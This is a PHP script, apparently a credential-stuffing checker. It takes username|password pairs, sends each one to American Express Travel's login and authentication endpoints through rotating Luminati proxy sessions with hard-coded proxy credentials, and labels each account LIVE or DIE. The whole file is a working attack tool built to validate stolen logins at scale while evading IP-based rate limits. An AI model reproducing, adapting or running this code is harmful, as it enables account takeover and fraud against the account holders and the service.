<?php
error_reporting(0);
require_once(__DIR__ . '/vendor/autoload.php');

if (!isset($_REQUEST['empas']) || !isset($_REQUEST['sock']))
{
  die(json_encode([
    'status'  =>  'FAIL',
    'empas'   =>  'FAIL|FAIL',
    'sock'    =>  'FAIL',
    'sec'     =>  'FAIL'
  ]));
}

use \Curl\Curl;

$start      = microtime(true);

$split      = explode('|', $_REQUEST['empas']);
$username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
$password   = $split[1];
if (empty($_REQUEST['empas']) || empty($username) || empty($password)) { die('GAADA EMPAS TOLOL'); }

$curl   =  new Curl();

// $sockque    = [
//   '199.189.86.111:8080',
//   '199.189.86.111:11000',
//   '199.189.86.111:10000',
//   '199.189.86.111:9800',
//   '199.189.86.111:8081',
//   '199.189.86.111:10600',
//   '199.189.86.111:9500'
// ];
//
// $sockque    = $sockque[rand(0, count($sockque)-1)];

// $curl->setOpt(CURLOPT_PROXY, $sockque);
// $curl->setOpt(CURLOPT_PROXYUSERPWD, '2a50df0561e46e7cddd813cf25fc5ef5:9b34940124351ce52f6bf24d97b5be84');
// $curl->setOpt(CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);




// LUMINATI

$session_id   = mt_rand();
$super_proxy  = 'http://'.gethostbyname("session-".$session_id.".zproxy.lum-superproxy.io").':22225';

$curl->setOpt(CURLOPT_PROXY, $super_proxy);
$curl->setOpt(CURLOPT_PROXYUSERPWD, "lum-customer-hl_7e2ca0b9-zone-static-session-".$session_id.":02s65zy44kis");

$curl->setOpt(CURLOPT_HTTPPROXYTUNNEL, TRUE);
$curl->setOpt(CURLOPT_TIMEOUT_MS, 20000);

$curl->setHeader('Host', 'travel.americanexpress.com');
$curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36');

$grabPage   = $curl->post('https://travel.americanexpress.com/travel/partner/subNav/login', http_build_query([
  'TLTSID'          =>  '56107'.rand(100000, 999999).'8016757'.rand(1000, 9999).'757' . rand(10000000, 99999999),
  'requestSource'   =>  'https://www.amextravel.com/flight-searches'
]));

$curl->setHeader('X-Requested-With', 'XMLHttpRequest');
$curl->setHeader('Accept', 'application/json, text/javascript, */*; q=0.01');
$curl->setHeader('Content-Type', 'application/json');
$curl->setHeader('Cookie', $curl->responseHeaders['set-cookie']);

$postAmex   = $curl->post('https://travel.americanexpress.com/travel/partner/authenticate', '{"userId":"'.$username.'","password":"'.$password.'","requestSource":"https://www.amextravel.com/api/user?redirect=https%3A%2F%2Fwww.amextravel.com%2Ffeatured-hotel-searches","clientId":""}');

if (!$postAmex) {
  $result = [
    'status'  =>  'TIMEOUT',
    'empas'   =>  $username . '|' . $password,
  ];
} else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {
  $result = [
    'status'  =>  'DIE',
    'empas'   =>  $username . '|' . $password,
  ];
} else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {
  $result = [
    'status'  =>  'LIVE',
    'empas'   =>  $username . '|' . $password,
  ];
} else if ($postAmex === 'Forbidden') {
  $result = [
    'status'  =>  '403',
    'empas'   =>  $username . '|' . $password,
  ];
} else if ($curl->getHttpStatusCode() === 400) {
  $result = [
    'status'  =>  '400',
    'empas'   =>  $username . '|' . $password,
  ];
} else {
  $result = [
    'status'  =>  $curl->getHttpStatusCode,
    'empas'   =>  $username . '|' . $password,
  ];
}
$result['sock'] = 'Sock: ' . $sockque;
$result['sec']  = (string) round((microtime(true) - $start)) . ' Sec';
die(json_encode($result));
